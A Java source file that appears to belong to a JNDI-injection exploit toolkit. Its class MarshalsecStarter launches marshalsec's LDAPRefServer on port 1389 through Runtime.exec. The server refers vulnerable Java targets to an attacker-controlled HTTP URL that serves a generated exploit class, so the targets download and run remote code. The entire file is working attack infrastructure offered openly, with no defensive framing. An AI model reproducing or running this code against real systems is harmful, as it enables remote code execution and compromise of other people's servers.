package com.github.marceloleite2604;

import java.io.IOException;
import java.nio.file.Paths;

public class MarshalsecStarter {

  public static final int MARSHALSEC_PORT = 1389;

  private static final String MARSHALSEC_PATH = Paths.get(
      "..",
      "marshalsec",
      "marshalsec-0.0.3-SNAPSHOT-all.jar")
    .toString();

  private static final String START_COMMAND_TEMPLATE =
    Exploiter.JAVA_8_HOME_PATH + "/bin/java -cp " + MARSHALSEC_PATH + " marshalsec.jndi.LDAPRefServer %s " + MARSHALSEC_PORT;

  private static final String REDIRECT_URL_TEMPLATE = "http://%s:%d";

  private static final String MARSHALSEC_URL_TEMPLATE = "%s/#%s";

  private String redirectUrl;

  public Process start(String host, int port) throws IOException {

    redirectUrl = String.format(REDIRECT_URL_TEMPLATE, host, port);

    final var marshalsecUri = String.format(MARSHALSEC_URL_TEMPLATE, redirectUrl, ExploitClassGenerator.CLASS_NAME);

    final var marshalsecStartCommand = String.format(START_COMMAND_TEMPLATE, marshalsecUri);
    return Runtime.getRuntime()
      .exec(marshalsecStartCommand);
  }

  public String getRedirectUrl() {
    return redirectUrl;
  }
}
